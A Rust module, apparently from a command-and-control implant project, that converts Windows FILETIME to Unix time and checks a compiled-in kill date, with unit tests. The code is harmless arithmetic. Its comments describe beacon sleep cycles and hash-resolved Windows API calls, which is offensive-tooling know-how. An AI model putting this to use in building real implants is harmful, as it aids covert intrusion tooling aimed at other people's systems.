//! Time and killswitch (port of the killswitch logic from the README of the
//! original project).
//!
//! The kill date is compiled into the beacon (`KILL_EPOCH`, 0 = disabled) and
//! compared against the wall clock at bootstrap and after every sleep
//! cycle. The clock is read through `GetSystemTimeAsFileTime` (resolved by
//! hash); the FILETIME to Unix epoch conversion lives here and is pure.

/// 100-ns ticks between 1601-01-01 (FILETIME epoch) and 1970-01-01.
pub const FILETIME_EPOCH_DELTA: u64 = 116_444_736_000_000_000;
/// FILETIME ticks per second.
pub const FILETIME_PER_SEC: u64 = 10_000_000;

/// Convert a FILETIME value (100-ns ticks since 1601) to a Unix epoch
/// timestamp in seconds. Saturates at/under the Unix epoch.
#[inline]
pub const fn filetime_to_unix_epoch(filetime: u64) -> u64 {
    if filetime <= FILETIME_EPOCH_DELTA {
        0
    } else {
        (filetime - FILETIME_EPOCH_DELTA) / FILETIME_PER_SEC
    }
}

/// Killswitch decision: a disabled killswitch (epoch 0) never expires.
#[inline]
pub const fn is_expired(kill_epoch: u64, now_epoch: u64) -> bool {
    kill_epoch != 0 && now_epoch >= kill_epoch
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn filetime_at_unix_epoch_is_zero() {
        // 1970-01-01T00:00:00Z: exactly the delta.
        assert_eq!(filetime_to_unix_epoch(FILETIME_EPOCH_DELTA), 0);
        assert_eq!(filetime_to_unix_epoch(0), 0);
    }

    #[test]
    fn known_dates_convert() {
        // 2026-01-01T00:00:00Z = 1767225600; 2027-01-01T00:00:00Z = 1798761600.
        assert_eq!(
            filetime_to_unix_epoch(134_116_992_000_000_000),
            1_767_225_600
        );
        assert_eq!(
            filetime_to_unix_epoch(134_432_352_000_000_000),
            1_798_761_600
        );
    }

    #[test]
    fn sub_second_precision_floors() {
        // 1.4s past the epoch: 14_000_000 ticks + delta.
        assert_eq!(filetime_to_unix_epoch(FILETIME_EPOCH_DELTA + 14_000_000), 1);
    }

    #[test]
    fn disabled_killswitch_never_expires() {
        assert!(!is_expired(0, u64::MAX));
    }

    #[test]
    fn killswitch_expires_at_and_after_the_epoch() {
        let kill = 1_767_225_600u64;
        assert!(!is_expired(kill, kill - 1));
        assert!(is_expired(kill, kill));
        assert!(is_expired(kill, kill + 1));
    }
}
